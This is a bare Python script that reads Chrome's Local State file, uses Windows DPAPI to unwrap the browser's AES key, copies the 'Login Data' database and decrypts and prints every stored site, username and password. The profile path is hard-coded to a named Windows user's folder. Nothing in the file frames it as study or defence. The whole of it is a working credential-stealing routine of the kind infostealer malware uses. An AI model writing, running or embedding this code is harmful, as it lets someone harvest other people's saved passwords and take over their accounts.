import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

profile = r"C:\Users\Syeda Ayesha\AppData\Local\Google\Chrome\User Data\Profile 1"
login_db = os.path.join(profile, "Login Data")
local_state_path = os.path.join(os.path.dirname(profile), "Local State")

with open(local_state_path, "r", encoding="utf-8") as f:
    local_state = json.load(f)

encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return f"[Decryption error] {str(e)}"

shutil.copy2(login_db, "LoginVault.db")
conn = sqlite3.connect("LoginVault.db")
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

for row in cursor.fetchall():
    url = row[0]
    username = row[1]
    encrypted_password = row[2]
    if encrypted_password:
        decrypted_password = decrypt_password(encrypted_password, key)
    else:
        decrypted_password = "[No password]"
    print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*40}")

cursor.close()
conn.close()
os.remove("LoginVault.db")
